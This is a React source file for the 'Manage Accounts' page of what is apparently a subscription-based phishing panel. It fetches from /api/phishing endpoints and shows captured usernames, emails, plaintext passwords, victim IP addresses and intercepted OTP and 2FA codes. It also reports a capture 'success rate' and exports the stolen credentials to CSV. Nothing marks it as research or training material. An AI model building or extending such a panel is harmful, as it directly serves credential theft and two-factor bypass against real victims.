import { useState, useEffect, useCallback } from 'react';
import { useTranslation } from 'react-i18next';
import { Page } from "components/shared/Page";
import { Card, Button, Badge, Modal, Input, Select } from "components/ui";
import { useThemeContext } from "app/contexts/theme/context";
import SubscriptionGuard from "components/guards/SubscriptionGuard";
import { 
  UsersIcon,
  EyeIcon,
  TrashIcon,
  MagnifyingGlassIcon,
  FunnelIcon,
  ArrowDownTrayIcon,
  CalendarIcon,
  GlobeAltIcon,
  UserIcon
} from '@heroicons/react/24/outline';
import { toast } from 'sonner';
import { formatTimeAgo } from 'utils/timeUtils';

export default function ManageAccounts() {
  const { isDark } = useThemeContext();
  const { t } = useTranslation();
  // const { user } = useAuthContext(); // Not needed for this component
  const [accounts, setAccounts] = useState([]);
  const [websites, setWebsites] = useState([]);
  const [isLoading, setIsLoading] = useState(true);
  const [selectedAccount, setSelectedAccount] = useState(null);
  const [isDetailModalOpen, setIsDetailModalOpen] = useState(false);
  const [isDeleteModalOpen, setIsDeleteModalOpen] = useState(false);
  const [pagination, setPagination] = useState({
    page: 1,
    limit: 20,
    total: 0,
    pages: 0
  });
  const [filters, setFilters] = useState({
    search: '',
    website_id: '',
    status: '',
    date_from: '',
    date_to: ''
  });
  const [stats, setStats] = useState({
    totalAccounts: 0,
    todayAccounts: 0,
    uniqueWebsites: 0,
    successRate: 0
  });

  // Load accounts data
  const loadAccounts = useCallback(async () => {
    try {
      setIsLoading(true);
      const token = localStorage.getItem('authToken');
      
      if (!token) {
        toast.error('Please log in to access accounts');
        return;
      }

      // Build query parameters
      const queryParams = new URLSearchParams({
        page: pagination.page,
        limit: pagination.limit,
        ...filters
      });

      const response = await fetch(`/api/phishing/accounts?${queryParams}`, {
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        }
      });
      
      if (response.ok) {
        const data = await response.json();
        setAccounts(data.data || []);
        setPagination(prev => ({
          ...prev,
          total: data.pagination?.total || 0,
          pages: data.pagination?.pages || 0
        }));
      } else if (response.status === 401 || response.status === 403) {
        toast.error('Authentication failed. Please log in again.');
        localStorage.removeItem('authToken');
      } else {
        toast.error('Failed to load accounts');
      }
    } catch (error) {
      console.error('Error loading accounts:', error);
      toast.error('Failed to load accounts');
    } finally {
      setIsLoading(false);
    }
  }, [pagination.page, pagination.limit, filters]);

  // Load websites for filter dropdown
  const loadWebsites = useCallback(async () => {
    try {
      const token = localStorage.getItem('authToken');
      
      const response = await fetch('/api/phishing/websites', {
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        }
      });
      
      if (response.ok) {
        const data = await response.json();
        setWebsites(data.data || []);
      }
    } catch (error) {
      console.error('Error loading websites:', error);
    }
  }, []);

  // Load stats
  const loadStats = useCallback(async () => {
    try {
      const token = localStorage.getItem('authToken');
      
      const response = await fetch('/api/phishing/accounts/stats', {
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        }
      });
      
      if (response.ok) {
        const data = await response.json();
        setStats(data.data || stats);
      }
    } catch (error) {
      console.error('Error loading stats:', error);
    }
  }, [stats]);

  useEffect(() => {
    loadAccounts();
  }, [loadAccounts]);

  useEffect(() => {
    loadWebsites();
    loadStats();
  }, [loadWebsites, loadStats]);

  // Handle filter changes
  const handleFilterChange = (key, value) => {
    setFilters(prev => ({ ...prev, [key]: value }));
    setPagination(prev => ({ ...prev, page: 1 }));
  };

  // Handle pagination
  const handlePageChange = (page) => {
    setPagination(prev => ({ ...prev, page }));
  };

  // Handle account deletion
  const handleDeleteAccount = async (accountId) => {
    try {
      const token = localStorage.getItem('authToken');
      
      const response = await fetch(`/api/phishing/accounts/${accountId}`, {
        method: 'DELETE',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        }
      });
      
      if (response.ok) {
        toast.success('Account deleted successfully');
        setIsDeleteModalOpen(false);
        setSelectedAccount(null);
        loadAccounts();
        loadStats();
      } else {
        toast.error('Failed to delete account');
      }
    } catch (error) {
      console.error('Error deleting account:', error);
      toast.error('Failed to delete account');
    }
  };

  // Export accounts to CSV
  const handleExportAccounts = async () => {
    try {
      const token = localStorage.getItem('authToken');
      
      const queryParams = new URLSearchParams(filters);
      const response = await fetch(`/api/phishing/accounts/export?${queryParams}`, {
        headers: {
          'Authorization': `Bearer ${token}`
        }
      });
      
      if (response.ok) {
        const blob = await response.blob();
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `accounts_export_${new Date().toISOString().split('T')[0]}.csv`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        window.URL.revokeObjectURL(url);
        toast.success('Accounts exported successfully');
      } else {
        toast.error('Failed to export accounts');
      }
    } catch (error) {
      console.error('Error exporting accounts:', error);
      toast.error('Failed to export accounts');
    }
  };

  // Get status badge color
  const getStatusColor = (status) => {
    switch (status) {
      case 'success': return 'success';
      case 'wrong-pass': return 'warning';
      case 'otp-mail': return 'info';
      case 'otp-phone': return 'info';
      case 'otp-2fa': return 'info';
      case 'order-device': return 'warning';
      case 'require-pass': return 'warning';
      case 'require-mail': return 'warning';
      default: return 'neutral';
    }
  };

  // Format status text
  const formatStatus = (status) => {
    const statusMap = {
      'success': 'Success',
      'wrong-pass': 'Wrong Password',
      'otp-mail': 'OTP Email',
      'otp-phone': 'OTP Phone',
      'otp-2fa': 'OTP 2FA',
      'order-device': 'Order Device',
      'require-pass': 'Require Password',
      'require-mail': 'Require Email'
    };
    return statusMap[status] || status;
  };

  return (
    <SubscriptionGuard>
      <Page title="Manage Accounts">
        <div className="transition-content w-full px-(--margin-x) pt-5 lg:pt-6">
          <div className="min-w-0">
            {/* Header */}
            <div className="mb-8">
              <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
                <div className="flex items-center gap-3">
                  <div className={`p-3 rounded-xl ${isDark ? 'bg-blue-500/20' : 'bg-blue-100'}`}>
                    <UsersIcon className={`h-6 w-6 ${isDark ? 'text-blue-400' : 'text-blue-600'}`} />
                  </div>
                  <div>
                    <h1 className="text-3xl font-bold text-gray-900 dark:text-white">
                      {t('pages.phishing.accounts.title')}
                    </h1>
                    <p className="mt-2 text-gray-600 dark:text-gray-400">
                      {t('pages.phishing.accounts.subtitle')}
                    </p>
                  </div>
                </div>
                <Button
                  onClick={handleExportAccounts}
                  className="flex items-center gap-2"
                  disabled={accounts.length === 0}
                >
                  <ArrowDownTrayIcon className="h-4 w-4" />
                  Export CSV
                </Button>
              </div>
            </div>

            {/* Stats Cards */}
            <div className="grid gap-6 md:grid-cols-4 mb-8">
              <Card className={`p-6 ${isDark ? 'bg-blue-900/20 border-blue-700' : 'bg-blue-50 border-blue-200'}`}>
                <div className="flex items-center gap-3">
                  <UsersIcon className="h-8 w-8 text-blue-600" />
                  <div>
                    <p className="text-2xl font-bold text-blue-900 dark:text-blue-100">
                      {stats.totalAccounts}
                    </p>
                    <p className="text-blue-700 dark:text-blue-300 text-sm">Total Accounts</p>
                  </div>
                </div>
              </Card>

              <Card className={`p-6 ${isDark ? 'bg-green-900/20 border-green-700' : 'bg-green-50 border-green-200'}`}>
                <div className="flex items-center gap-3">
                  <CalendarIcon className="h-8 w-8 text-green-600" />
                  <div>
                    <p className="text-2xl font-bold text-green-900 dark:text-green-100">
                      {stats.todayAccounts}
                    </p>
                    <p className="text-green-700 dark:text-green-300 text-sm">Today&apos;s Accounts</p>
                  </div>
                </div>
              </Card>

              <Card className={`p-6 ${isDark ? 'bg-purple-900/20 border-purple-700' : 'bg-purple-50 border-purple-200'}`}>
                <div className="flex items-center gap-3">
                  <GlobeAltIcon className="h-8 w-8 text-purple-600" />
                  <div>
                    <p className="text-2xl font-bold text-purple-900 dark:text-purple-100">
                      {stats.uniqueWebsites}
                    </p>
                    <p className="text-purple-700 dark:text-purple-300 text-sm">Active Websites</p>
                  </div>
                </div>
              </Card>

              <Card className={`p-6 ${isDark ? 'bg-orange-900/20 border-orange-700' : 'bg-orange-50 border-orange-200'}`}>
                <div className="flex items-center gap-3">
                  <FunnelIcon className="h-8 w-8 text-orange-600" />
                  <div>
                    <p className="text-2xl font-bold text-orange-900 dark:text-orange-100">
                      {stats.successRate}%
                    </p>
                    <p className="text-orange-700 dark:text-orange-300 text-sm">Success Rate</p>
                  </div>
                </div>
              </Card>
            </div>

            {/* Filters */}
            <Card className="p-6 mb-6">
              <div className="grid grid-cols-1 md:grid-cols-5 gap-4">
                <div className="relative">
                  <MagnifyingGlassIcon className="h-5 w-5 absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400" />
                  <Input
                    placeholder="Search username, email..."
                    value={filters.search}
                    onChange={(e) => handleFilterChange('search', e.target.value)}
                    className="pl-10"
                  />
                </div>
                
                <Select
                  value={filters.website_id}
                  onChange={(e) => handleFilterChange('website_id', e.target.value)}
                  data={[
                    { value: '', label: 'All Websites' },
                    ...websites.map(website => ({
                      value: website.id.toString(),
                      label: website.title
                    }))
                  ]}
                />

                <Select
                  value={filters.status}
                  onChange={(e) => handleFilterChange('status', e.target.value)}
                  data={[
                    { value: '', label: 'All Status' },
                    { value: 'success', label: 'Success' },
                    { value: 'wrong-pass', label: 'Wrong Password' },
                    { value: 'otp-mail', label: 'OTP Email' },
                    { value: 'otp-phone', label: 'OTP Phone' },
                    { value: 'otp-2fa', label: 'OTP 2FA' },
                  ]}
                />

                <Input
                  type="date"
                  placeholder="From Date"
                  value={filters.date_from}
                  onChange={(e) => handleFilterChange('date_from', e.target.value)}
                />

                <Input
                  type="date"
                  placeholder="To Date"
                  value={filters.date_to}
                  onChange={(e) => handleFilterChange('date_to', e.target.value)}
                />
              </div>
            </Card>

            {/* Accounts Table */}
            <Card className="overflow-hidden">
              <div className="overflow-x-auto">
                <table className="min-w-full divide-y divide-gray-200 dark:divide-gray-700">
                  <thead className="bg-gray-50 dark:bg-gray-800">
                    <tr>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-400 uppercase tracking-wider">
                        Account
                      </th>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-400 uppercase tracking-wider">
                        Website
                      </th>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-400 uppercase tracking-wider">
                        Status
                      </th>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-400 uppercase tracking-wider">
                        IP Address
                      </th>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-400 uppercase tracking-wider">
                        Captured
                      </th>
                      <th className="px-6 py-3 text-right text-xs font-medium text-gray-500 dark:text-gray-400 uppercase tracking-wider">
                        Actions
                      </th>
                    </tr>
                  </thead>
                  <tbody className="bg-white dark:bg-gray-900 divide-y divide-gray-200 dark:divide-gray-700">
                    {isLoading ? (
                      <tr>
                        <td colSpan="6" className="px-6 py-12 text-center">
                          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary-500 mx-auto mb-4"></div>
                          <p className="text-gray-500 dark:text-gray-400">Loading accounts...</p>
                        </td>
                      </tr>
                    ) : accounts.length === 0 ? (
                      <tr>
                        <td colSpan="6" className="px-6 py-12 text-center">
                          <div className="text-gray-500 dark:text-gray-400">
                            <UsersIcon className="h-12 w-12 mx-auto mb-4" />
                            <p>No accounts found</p>
                          </div>
                        </td>
                      </tr>
                    ) : (
                      accounts.map((account) => (
                        <tr key={account.id} className="hover:bg-gray-50 dark:hover:bg-gray-800">
                          <td className="px-6 py-4 whitespace-nowrap">
                            <div className="flex items-center">
                              <div className="flex-shrink-0">
                                <div className="w-10 h-10 bg-gray-100 dark:bg-gray-700 rounded-full flex items-center justify-center">
                                  <UserIcon className="h-5 w-5 text-gray-600 dark:text-gray-400" />
                                </div>
                              </div>
                              <div className="ml-4">
                                <div className="text-sm font-medium text-gray-900 dark:text-white">
                                  {account.username}
                                </div>
                                {account.email && (
                                  <div className="text-sm text-gray-500 dark:text-gray-400">
                                    {account.email}
                                  </div>
                                )}
                              </div>
                            </div>
                          </td>
                          <td className="px-6 py-4 whitespace-nowrap">
                            <div className="text-sm text-gray-900 dark:text-white">
                              {account.website_title || `Website #${account.website}`}
                            </div>
                          </td>
                          <td className="px-6 py-4 whitespace-nowrap">
                            <Badge
                              color={getStatusColor(account.status)}
                              variant="soft"
                            >
                              {formatStatus(account.status)}
                            </Badge>
                          </td>
                          <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500 dark:text-gray-400">
                            {account.ip_address || 'N/A'}
                          </td>
                          <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500 dark:text-gray-400">
                            {formatTimeAgo(account.created_at)}
                          </td>
                          <td className="px-6 py-4 whitespace-nowrap text-right text-sm font-medium">
                            <div className="flex items-center justify-end gap-2">
                              <Button
                                variant="flat"
                                size="sm"
                                onClick={() => {
                                  setSelectedAccount(account);
                                  setIsDetailModalOpen(true);
                                }}
                              >
                                <EyeIcon className="h-4 w-4" />
                              </Button>
                              <Button
                                variant="flat"
                                color="error"
                                size="sm"
                                onClick={() => {
                                  setSelectedAccount(account);
                                  setIsDeleteModalOpen(true);
                                }}
                              >
                                <TrashIcon className="h-4 w-4" />
                              </Button>
                            </div>
                          </td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>

              {/* Pagination */}
              {pagination.pages > 1 && (
                <div className="px-6 py-4 border-t border-gray-200 dark:border-gray-700">
                  <div className="flex items-center justify-between">
                    <div className="text-sm text-gray-700 dark:text-gray-300">
                      Showing {((pagination.page - 1) * pagination.limit) + 1} to {Math.min(pagination.page * pagination.limit, pagination.total)} of {pagination.total} results
                    </div>
                    <div className="flex gap-2">
                      <Button
                        variant="outlined"
                        size="sm"
                        onClick={() => handlePageChange(pagination.page - 1)}
                        disabled={pagination.page <= 1}
                      >
                        Previous
                      </Button>
                      {[...Array(Math.min(pagination.pages, 5))].map((_, i) => {
                        const page = i + Math.max(1, pagination.page - 2);
                        return (
                          <Button
                            key={page}
                            variant={pagination.page === page ? "filled" : "outlined"}
                            size="sm"
                            onClick={() => handlePageChange(page)}
                          >
                            {page}
                          </Button>
                        );
                      })}
                      <Button
                        variant="outlined"
                        size="sm"
                        onClick={() => handlePageChange(pagination.page + 1)}
                        disabled={pagination.page >= pagination.pages}
                      >
                        Next
                      </Button>
                    </div>
                  </div>
                </div>
              )}
            </Card>
          </div>
        </div>

        {/* Account Detail Modal */}
        <Modal
          open={isDetailModalOpen}
          onClose={() => setIsDetailModalOpen(false)}
          title="Account Details"
          size="lg"
        >
          {selectedAccount && (
            <div className="space-y-6">
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300">
                    Username
                  </label>
                  <p className="mt-1 text-sm text-gray-900 dark:text-white">
                    {selectedAccount.username}
                  </p>
                </div>
                
                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300">
                    Password
                  </label>
                  <p className="mt-1 text-sm font-mono text-gray-900 dark:text-white">
                    {selectedAccount.password}
                  </p>
                </div>
                
                {selectedAccount.email && (
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300">
                      Email
                    </label>
                    <p className="mt-1 text-sm text-gray-900 dark:text-white">
                      {selectedAccount.email}
                    </p>
                  </div>
                )}
                
                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300">
                    Website
                  </label>
                  <p className="mt-1 text-sm text-gray-900 dark:text-white">
                    {selectedAccount.website_title || `Website #${selectedAccount.website}`}
                  </p>
                </div>
                
                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300">
                    IP Address
                  </label>
                  <p className="mt-1 text-sm text-gray-900 dark:text-white">
                    {selectedAccount.ip_address || 'N/A'}
                  </p>
                </div>
                
                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300">
                    Status
                  </label>
                  <div className="mt-1">
                    <Badge color={getStatusColor(selectedAccount.status)} variant="soft">
                      {formatStatus(selectedAccount.status)}
                    </Badge>
                  </div>
                </div>
                
                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300">
                    Captured At
                  </label>
                  <p className="mt-1 text-sm text-gray-900 dark:text-white">
                    {new Date(selectedAccount.created_at).toLocaleString()}
                  </p>
                </div>
                
                {selectedAccount.code && (
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300">
                      Code
                    </label>
                    <p className="mt-1 text-sm font-mono text-gray-900 dark:text-white">
                      {selectedAccount.code}
                    </p>
                  </div>
                )}
              </div>
              
              <div className="flex justify-end">
                <Button
                  onClick={() => setIsDetailModalOpen(false)}
                  variant="outlined"
                >
                  Close
                </Button>
              </div>
            </div>
          )}
        </Modal>

        {/* Delete Confirmation Modal */}
        <Modal
          open={isDeleteModalOpen}
          onClose={() => setIsDeleteModalOpen(false)}
          title="Delete Account"
          size="md"
        >
          {selectedAccount && (
            <div className="space-y-4">
              <p className="text-gray-600 dark:text-gray-400">
                Are you sure you want to delete the account for <strong>{selectedAccount.username}</strong>?
                This action cannot be undone.
              </p>
              
              <div className="flex justify-end gap-3">
                <Button
                  onClick={() => setIsDeleteModalOpen(false)}
                  variant="outlined"
                >
                  Cancel
                </Button>
                <Button
                  onClick={() => handleDeleteAccount(selectedAccount.id)}
                  color="error"
                >
                  Delete Account
                </Button>
              </div>
            </div>
          )}
        </Modal>
      </Page>
    </SubscriptionGuard>
  );
}
